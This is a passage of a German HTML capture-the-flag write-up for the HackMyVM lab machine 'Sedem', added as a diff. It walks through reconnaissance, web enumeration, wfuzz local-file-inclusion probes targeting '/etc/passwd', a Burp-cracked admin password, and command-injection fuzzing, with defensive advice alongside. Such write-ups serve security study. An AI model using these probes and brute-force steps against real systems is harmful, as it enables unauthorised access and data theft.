@@ -1,0 +1,803 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sedem - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Sedem - HackMyVM - Level: Medium - Bericht</h1>
+        <!-- Klasse 'medium' hinzugefügt, damit CSS die korrekte Farbe (Gelb) anwenden kann -->
+        <div class="level-container medium">
+            <!-- Die Farbe wird durch CSS über die Klasse 'medium' gesteuert -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben werden durch CSS über die Klasse 'medium' gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Der innere Kreis verwendet die Standard-Header-Farbe aus dem CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">pppdump</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">strings</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-user1">Privilege Escalation (User1)</a></li>
+                <li><a href="#privilege-escalation-user2">Privilege Escalation (User2)</a></li>
+                <li><a href="#privilege-escalation-user3">Privilege Escalation (User3)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Root)</a></li>
+                <li><a href="#poc-root">Proof of Concept: Root Exploit (PATH Hijacking)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.138	<span class="command">08:00:27:09:2b:13</span>	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um aktive Geräte im lokalen Netzwerk mittels ARP-Anfragen zu identifizieren. Es antwortet ein Gerät mit der IP `192.168.2.138` und der MAC-Adresse `08:00:27:09:2b:13`, welche auf eine VirtualBox-VM (PCS Systemtechnik GmbH OUI) hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ziel-IP für weitere Scans identifiziert. Der Hinweis auf VirtualBox ist nützlich für den Kontext.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Port-Scan (Nmap) auf `192.168.2.138` durch.<br/><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung auf ARP-Scans können helfen, die Aufklärungsphase zu erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.107 -p-</span></div>
+                     <pre>
+PORT   STATE SERVICE VERSION
+---------------------------------------------------------------------
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 98:92:88:a4:7b:42:f4:61:64:00:fb:b1:3d:7b:81:f5 (RSA)</span>
+|   <span class="command">256 16:8b:ea:50:06:91:fa:10:c4:5a:6c:e1:07:bb:f8:5a (ECDSA)</span>
+|_  <span class="command">256 cd:bc:e3:bd:cb:28:92:25:6e:7e:91:3f:61:6d:1b:5f (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_<span class="command">http-title: Titre</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf die IP `192.168.2.107` durchgeführt (Hinweis: Diese IP unterscheidet sich von der im `arp-scan` gefundenen IP `192.168.2.138`. Es wird angenommen, dass `.107` die korrekte Ziel-IP ist oder der Angreifer aus einem anderen Grund diese IP scannt. Der Scan verwendet SYN-Scan (`-sS`), Standard-Skripte (`-sC`), schnelles Timing (`-T5`), Versionserkennung (`-sV`), erweiterte Erkennung (`-A`) und scannt alle Ports (`-p-`). Es werden zwei offene Ports gefunden: SSH (Port 22) mit OpenSSH 7.9p1 und HTTP (Port 80) mit Apache 2.4.38. Der Titel der Webseite auf Port 80 ist "Titre".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die primären Angriffsvektoren sind SSH und HTTP. Die Versionsinformationen sind nützlich für die Schwachstellensuche. Der generische Titel "Titre" gibt wenig Aufschluss, aber der Apache-Server ist das Hauptziel für die weitere Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 weiter mittels Directory Brute-Forcing und Schwachstellenscans (z.B. Nikto). Prüfen Sie SSH auf bekannte Schwachstellen oder versuchen Sie Brute-Force-Angriffe, falls andere Methoden fehlschlagen.<br/><strong>Empfehlung (Admin):</strong> Halten Sie SSH und Apache aktuell. Implementieren Sie eine Web Application Firewall (WAF). Beschränken Sie den Zugriff auf SSH (z.B. durch Firewall-Regeln, Fail2ban).</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.107" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg</span></div>
+                     <pre>
+http://192.168.2.107/image.jpg            (Status: 200) [Size: 117003]
+http://192.168.2.107/index.html           (Status: 200) [Size: 166]
+http://192.168.2.107/manual               (Status: 301) [Size: 315] [--> <span class="command">http://192.168.2.107/manual/</span>]
+http://192.168.2.107/sysadmin             (Status: 301) [Size: 317] [--> <span class="command">http://192.168.2.107/sysadmin/</span>]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden. Es verwendet die Wortliste `directory-list-2.3-medium.txt` und sucht nach spezifischen Erweiterungen (`-x`). Es findet eine Bilddatei (`image.jpg`), eine Indexdatei (`index.html`), ein Apache-Manual-Verzeichnis (`/manual/`) und ein potenziell interessantes Verzeichnis `/sysadmin/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis `/sysadmin/` ist das vielversprechendste Ergebnis und sollte genauer untersucht werden. Das Apache-Manual (`/manual/`) kann manchmal Versionsinformationen oder Konfigurationsdetails preisgeben, ist aber oft weniger nützlich. Die Bilddatei `image.jpg` könnte für Steganografie relevant sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/sysadmin/`-Verzeichnis. Laden Sie `image.jpg` herunter und prüfen Sie es auf versteckte Daten (Steganografie, Metadaten). Schauen Sie sich das `/manual/`-Verzeichnis an.<br/><strong>Empfehlung (Admin):</strong> Entfernen oder beschränken Sie den Zugriff auf das Apache-Manual (`/manual/`). Stellen Sie sicher, dass administrative Verzeichnisse wie `/sysadmin/` ordnungsgemäß geschützt sind (Authentifizierung, Zugriffsbeschränkung).</p>
+
+            <h3>Analyse von image.jpg</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.107/image.jpg</span></div>
+                    <pre><!-- Wget-Ausgabe wird normalerweise angezeigt, hier weggelassen --></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `image.jpg` wird vom Webserver heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardvorgehen zur Dateibeschaffung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek /usr/share/wordlists/rockyou.txt image.jpg</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="password">[!] error: the file format of the file "/usr/share/wordlists/rockyou.txt" is not supported.</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, `stegseek` zu verwenden, um mit der `rockyou.txt`-Wortliste versteckte Daten (die mit einem Passwort aus der Liste geschützt sind) in `image.jpg` zu finden. `stegseek` gibt jedoch einen Fehler aus, dass das Format von `rockyou.txt` nicht unterstützt wird. Dies liegt wahrscheinlich daran, dass `stegseek` die Wortliste direkt als potenzielle Passwörter erwartet und nicht das Format der Wortliste selbst analysiert, oder es gibt ein Kompatibilitätsproblem.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser `stegseek`-Versuch schlug fehl, möglicherweise aufgrund einer falschen Annahme über die Funktionsweise von `stegseek` oder eines Fehlers im Tool/Aufruf. Es liefert kein Ergebnis bezüglich versteckter Daten im Bild.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die `stegseek`-Dokumentation. Versuchen Sie andere Steganografie-Tools wie `steghide` (oft in Verbindung mit `rockyou.txt`) oder `zsteg`. Fahren Sie parallel mit der Untersuchung anderer gefundener Pfade fort.<br/><strong>Empfehlung (Admin):</strong> Verhindern Sie das Hochladen oder Bereitstellen von Dateien, die potenziell für Steganografie missbraucht werden könnten, wenn dies nicht notwendig ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C image.jpg</span></div>
+                     <pre>sdsd</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `stegsnow` ist ein weiteres Steganografie-Tool, das oft für das Verstecken von Daten in Whitespace (Leerzeichen, Tabs) am Ende von Zeilen in Textdateien verwendet wird, aber auch mit JPEG-Komprimierung (-C) umgehen kann. Der Befehl versucht, versteckte Daten aus `image.jpg` zu extrahieren. Die Ausgabe ist "sdsd".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe "sdsd" ist kurz und kryptisch. Es könnte sich um versteckte Daten handeln, aber ohne weiteren Kontext ist es schwer zu sagen, ob dies nützlich oder nur Datenmüll ist. Es scheint nicht direkt weiterzuhelfen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie sich "sdsd" für den Fall, dass es später relevant wird (z.B. als Teil eines Passworts oder Hinweises). Konzentrieren Sie sich auf vielversprechendere Angriffsvektoren.<br/><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zu Steganografie.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool image.jpg</span></div>
+                     <pre>
+ExifTool Version Number         : 12.44
+File Name                       : image.jpg
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um Metadaten (EXIF-Daten) aus der Bilddatei zu extrahieren. Die Ausgabe zeigt hier nur die `exiftool`-Version und den Dateinamen, aber keine weiteren Metadaten wie Kommentare, GPS-Koordinaten oder Kamerainformationen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine nützlichen Informationen aus den Metadaten gewonnen. Die Steganografie-Analyse von `image.jpg` scheint insgesamt keine Ergebnisse geliefert zu haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Legen Sie die Analyse von `image.jpg` vorerst beiseite und konzentrieren Sie sich auf das `/sysadmin`-Verzeichnis.<br/><strong>Empfehlung (Admin):</strong> Entfernen Sie Metadaten aus Bildern, die öffentlich bereitgestellt werden, um Informationslecks zu vermeiden.</p>
+
+            <h3>Untersuchung von /sysadmin</h3>
+            <p class="analysis"><strong>Analyse:</strong> Nun wird das gefundene Verzeichnis `/sysadmin/` untersucht.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://192.168.2.107/sysadmin
+Forbidden
+
+You don't have permission to access on this folder
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Beim Versuch, direkt auf das Verzeichnis `http://192.168.2.107/sysadmin` zuzugreifen, liefert der Server einen "403 Forbidden"-Fehler. Dies bedeutet, dass der Zugriff auf das Verzeichnis selbst (z.B. für eine Verzeichnisauflistung) verweigert wird, aber nicht notwendigerweise auf Dateien innerhalb des Verzeichnisses.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Zugriffsbeschränkung ist ein gutes Zeichen aus Verteidigersicht, verhindert aber den direkten Einblick. Wir müssen versuchen, spezifische Dateien innerhalb dieses Verzeichnisses zu finden oder zu erraten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie weiteres Directory/File Brute-Forcing gezielt auf das `/sysadmin/`-Verzeichnis durch (z.B. `gobuster dir -u http://192.168.2.107/sysadmin/ ...`). Suchen Sie nach gängigen Dateinamen wie `index.php`, `login.php`, `admin.php` etc.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Verzeichnisauflistungen deaktiviert sind (`Options -Indexes` in Apache `.htaccess` oder Konfiguration).</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+http://192.168.2.107/sysadmin/index.php
+</pre>
+                  </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, direkt auf `index.php` im `/sysadmin`-Verzeichnis zuzugreifen. Im Gegensatz zum Verzeichnis selbst scheint der Zugriff auf diese Datei möglich zu sein (kein Fehler wird angezeigt, impliziert einen HTTP 200 OK Status). Es wird nicht gezeigt, was diese Seite anzeigt, aber es ist wahrscheinlich ein Login-Formular oder ein Admin-Panel.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `index.php` im Admin-Verzeichnis ist ein wichtiger Fund. Dies ist der nächste Angriffspunkt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die `index.php`-Seite im Browser. Suchen Sie nach Login-Feldern, Quellcode-Hinweisen, JavaScript-Dateien. Versuchen Sie Standard-Logins (admin/admin etc.) oder Brute-Force-Angriffe auf das Login.<br/><strong>Empfehlung (Admin):</strong> Schützen Sie Admin-Login-Seiten robust (starke Passwörter, Zwei-Faktor-Authentifizierung, Schutz vor Brute-Force-Angriffen wie Fail2ban oder Captchas).</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Die nächsten Zeilen im Originaltext scheinen eine Wiederholung oder Verwechslung von IP-Adressen und Gobuster-Ergebnissen zu sein. Es wird die IP `.138` verwendet und Ergebnisse aufgelistet, die teilweise schon für `.107` gefunden wurden. Dann wird ein weiterer Gobuster-Scan auf Unterverzeichnisse von `/sysadmin` auf `.107` gezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ich ignoriere die inkonsistenten/wiederholten Zeilen und konzentriere mich auf den relevanten Fund im `/sysadmin`-Verzeichnis von `192.168.2.107`.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+http://192.168.2.107/sysadmin/bootstrap/css                (Status: 301) [Size: 331] [--> http://192.168.2.107/sysadmin/bootstrap/css/]
+http://192.168.2.107/sysadmin/bootstrap/js                 (Status: 301) [Size: 330] [--> http://192.168.2.107/sysadmin/bootstrap/js/]
+http://192.168.2.107/sysadmin/include/header.php           (Status: 200) [Size: 512]
+http://192.168.2.107/sysadmin/include/footer.php           (Status: 200) [Size: 16]
+</pre>
+                  </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer (impliziter) Gobuster-Scan auf `/sysadmin/` findet Bootstrap-Verzeichnisse (Framework für Webdesign) und ein `/include`-Verzeichnis mit `header.php` und `footer.php`. Solche Include-Dateien enthalten oft Konfigurationen, Datenbankzugangsdaten oder anfälligen Code.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Dateien `header.php` und `footer.php` sind potenziell sehr interessant, da sie möglicherweise direkt aufgerufen oder für Local File Inclusion (LFI) / Remote File Inclusion (RFI) missbraucht werden könnten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, `header.php` und `footer.php` direkt im Browser aufzurufen oder ihren Quellcode herunterzuladen. Testen Sie auf LFI/RFI-Schwachstellen, indem Sie versuchen, Parameter an `index.php` oder andere Skripte anzuhängen, die diese Dateien möglicherweise einbinden (z.B. `index.php?page=../../../../etc/passwd`).<br/><strong>Empfehlung (Admin):</strong> Speichern Sie sensible Informationen (wie DB-Zugangsdaten) nicht direkt in Include-Dateien im Web-Root. Validieren und bereinigen Sie alle Benutzereingaben, die zur Konstruktion von Dateipfaden verwendet werden, um LFI/RFI zu verhindern. Beschränken Sie den direkten Zugriff auf Include-Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://sedem.hmv</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.107</span>
++ Target Hostname:    <span class="command">sedem.hmv</span>
++ Target Port:        80
++ Start Time:         2022-10-01 00:12:01 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.38 (Debian)</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: a6, size: 5c1e5ab29713a, mtime: gzip
++ <span class="password">Allowed HTTP Methods: OPTIONS, HEAD, GET, POST</span>
++ <span class="password">OSVDB-3092: /manual/: Web server manual found.</span>
++ <span class="password">OSVDB-3268: /manual/images/: Directory indexing found.</span>
++ <span class="password">OSVDB-3233: /icons/README: Apache default file found.</span>
++ <span class="password">Cookie PHPSESSID created without the httponly flag</span>
++ 7785 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-10-01 00:13:44 (GMT2) (103 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto, ein Webserver-Scanner, wird auf das Ziel `sedem.hmv` (welches auf `192.168.2.107` auflöst) ausgeführt. Nikto prüft auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse.
+                *   Bestätigt den Apache-Server.
+                *   Meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Expect-CT`). Diese erhöhen die Anfälligkeit für Clickjacking, Cross-Site Scripting (XSS) und MIME-Sniffing-Angriffe.
+                *   Findet das Apache-Manual (`/manual/`) und Verzeichnisauflistung (`/manual/images/`).
+                *   Findet eine Apache-Standarddatei (`/icons/README`).
+                *   Stellt fest, dass das `PHPSESSID`-Cookie nicht mit dem `HttpOnly`-Flag gesetzt wird, was es anfälliger für Diebstahl durch XSS macht.
+                *   Identifiziert erlaubte HTTP-Methoden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto hebt mehrere Best-Practice-Verstöße und kleinere Schwachstellen hervor (fehlende Header, HttpOnly-Flag). Diese führen nicht direkt zu einem initialen Zugriff, deuten aber auf eine potenziell nachlässige Konfiguration hin. Die Funde bezüglich `/manual/` bestätigen die Gobuster-Ergebnisse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Information über fehlende Header und Flags für mögliche XSS- oder Session-Hijacking-Angriffe, falls andere Angriffsvektoren fehlschlagen. Die Nikto-Ergebnisse untermauern die Notwendigkeit, das `/sysadmin`-Verzeichnis weiter zu untersuchen.<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security` für HTTPS, `Content-Security-Policy`). Setzen Sie das `HttpOnly`- und `Secure`-Flag für Session-Cookies. Entfernen Sie unnötige Standarddateien und Verzeichnisse wie `/icons/README` und `/manual/`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://sedem.hmv/sysadmin/index.php?FUZZ=../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --hh 75</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://sedem.hmv/sysadmin/index.php?FUZZ=../../../../etc/passwd
+Total requests: 21979
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000009532:   400        12 L     53 W       422 Ch      "#www"</span>
+<span class="command">000010581:   400        12 L     53 W       422 Ch      "#mail"</span>
+<span class="command">000047706:   400        12 L     53 W       422 Ch      "#smtp"</span>
+<span class="command">000103135:   400        12 L     53 W       422 Ch      "#pop3"</span>
+
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird `wfuzz` verwendet, um eine Local File Inclusion (LFI)-Schwachstelle zu finden. Es wird versucht, verschiedene Parameter (`FUZZ` wird durch Einträge aus `directory-list-2.3-medium.txt` ersetzt) an `index.php` anzuhängen, wobei der Wert des Parameters immer `../../../../etc/passwd` ist. Ziel ist es, einen Parameter zu finden (z.B. `page`, `file`, `include`), der dazu führt, dass `index.php` den Inhalt von `/etc/passwd` einbindet und anzeigt. `--hh 75` weist `wfuzz` an, Antworten mit genau 75 Zeichen auszublenden (dies ist wahrscheinlich die Größe der normalen Antwort, wenn LFI fehlschlägt). Die angezeigten Ergebnisse (HTTP 400 - Bad Request) deuten darauf hin, dass die verwendeten Payloads keine gültigen Parameter waren oder die Anfrage blockiert wurde. Es wurde kein erfolgreicher LFI gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, LFI über das Erraten von Parametern mit `wfuzz` zu finden, war hier nicht erfolgreich. Die Methode ist valide, aber es scheint keinen gängigen LFI-Parameter in `index.php` zu geben oder er ist anders geschützt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von `index.php` (falls zugänglich) oder die JavaScript-Dateien auf Hinweise zu verwendeten Parameternamen. Versuchen Sie andere Fuzzing-Techniken oder konzentrieren Sie sich auf andere Schwachstellen (z.B. Login-Brute-Force, Command Injection).<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie sichere Programmierungspraktiken, um LFI zu verhindern (keine Benutzereingaben direkt in Dateipfad-Funktionen verwenden, Whitelisting erlaubter Dateien).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die nächsten Zeilen scheinen den Inhalt der zuvor gefundenen Include-Dateien zu zeigen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://192.168.2.107/sysadmin/include/header.php
+ Admin panel
+
+http://192.168.2.107/sysadmin/include/footer.php
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Beim direkten Aufruf von `header.php` wird "Admin panel" angezeigt. Der Aufruf von `footer.php` liefert keine sichtbare Ausgabe (oder nur Whitespace). </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Dateien scheinen direkt aufrufbar zu sein, liefern aber keine sofort ersichtlichen Schwachstellen oder sensiblen Informationen. Der "Admin panel"-Text bestätigt den Zweck des `/sysadmin`-Bereichs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den Quellcode dieser Dateien (Rechtsklick -> Quelltext anzeigen im Browser oder `curl`/`wget`). Manchmal sind sensible Informationen in PHP-Kommentaren oder Variablen versteckt, die nicht direkt ausgegeben werden.<br/><strong>Empfehlung (Admin):</strong> Verhindern Sie den direkten Aufruf von Include-Dateien, z.B. indem Sie am Anfang jeder Include-Datei prüfen, ob eine bestimmte Konstante (die nur im Hauptskript definiert wird) gesetzt ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://192.168.2.107/sysadmin/include/footer.php?FUZZ=../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --hh 16</span></div>
+                     <pre>
+[...]
+Not Found
+
+The requested URL was not found on this server.
+Apache/2.4.38 (Debian) Server at 192.168.2.107 Port 80
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer `wfuzz`-Versuch, LFI über die `footer.php` zu finden. Es werden wieder Parameter aus der Wortliste getestet, diesmal mit dem Ziel `/etc/passwd`. `--hh 16` blendet Antworten mit 16 Zeichen aus (vermutlich die Größe der leeren `footer.php`-Antwort). Das Ergebnis ist jedoch ein "404 Not Found"-Fehler des Servers, was darauf hindeutet, dass die Kombination aus Pfad und Parameter nicht existiert oder blockiert wird. Kein LFI gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Auch dieser LFI-Versuch war erfolglos.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> LFI scheint hier unwahrscheinlich oder gut geschützt zu sein. Konzentration auf andere Angriffsvektoren.<br/><strong>Empfehlung (Admin):</strong> LFI-Schutzmaßnahmen überprüfen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der nächste Abschnitt deutet auf einen erfolgreichen Login-Crack und anschließende Command Injection hin.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ip addon firefox IP der seite :X-forwarded-for aktiviert
+
+mit burp login gecrackt
+User:<span class="command">admin</span>
+pass:<span class="password">fucker1</span>
+
+http://192.168.2.107/sysadmin/system/
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Notizen deuten darauf hin, dass:
+                *   Ein Firefox-Addon verwendet wurde, um den `X-Forwarded-For`-Header zu setzen (möglicherweise um eine IP-basierte Zugriffsbeschränkung zu umgehen oder Logs zu manipulieren).
+                *   Mit Burp Suite ein Brute-Force-Angriff auf das Login-Formular (vermutlich `/sysadmin/index.php`) durchgeführt wurde.
+                *   Die gültigen Zugangsdaten `admin` / `<span class="password">fucker1</span>` gefunden wurden.
+                *   Nach dem Login landet man im Verzeichnis `/sysadmin/system/`.
+            </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Sehr wichtiger Schritt! Der erfolgreiche Login als `admin` öffnet den Zugang zum Admin-Bereich `/sysadmin/system/`. Das Passwort `<span class="password">fucker1</span>` ist schwach und wurde durch Brute-Force gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich mit den gefundenen Zugangsdaten ein und untersuchen Sie die Funktionalität im `/sysadmin/system/`-Bereich. Suchen Sie nach Möglichkeiten, Befehle auszuführen, Dateien hochzuladen oder Konfigurationen zu ändern.<br/><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke Passwörter. Implementieren Sie Account-Sperrungen nach mehreren fehlgeschlagenen Login-Versuchen, um Brute-Force-Angriffe zu verhindern. Überwachen Sie Admin-Logins.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://192.168.2.107/sysadmin/system/?FUZZ=id" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --hh 0</span></div>
+                     <pre><!-- Keine relevanten Ergebnisse gezeigt --></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login wird versucht, mit `wfuzz` einen Parameter für Command Injection im Verzeichnis `/sysadmin/system/` zu finden. Es wird versucht, verschiedene Parameter (`FUZZ` ersetzt durch Wortliste) mit dem Wert `id` zu senden. `--hh 0` blendet leere Antworten aus. Im Originaltext werden keine erfolgreichen Ergebnisse dieses Scans gezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser `wfuzz`-Versuch scheint nicht direkt zum Ziel geführt zu haben, obwohl Command Injection im Admin-Bereich ein plausibler Angriffsvektor ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+mit Burb klappte es mit §cmd§ als Parameter und der Liste:
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
